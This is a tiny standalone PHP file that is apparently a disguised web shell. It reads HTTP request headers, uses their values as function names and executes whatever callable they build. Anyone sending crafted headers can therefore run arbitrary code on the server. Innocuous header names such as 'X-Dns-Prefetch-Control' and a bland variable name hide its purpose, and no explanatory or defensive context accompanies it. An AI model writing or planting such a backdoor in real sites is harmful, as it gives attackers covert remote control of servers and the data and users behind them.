<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $ob_iconv_handle = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['If-Modified-Since']));
    $ob_iconv_handle();
}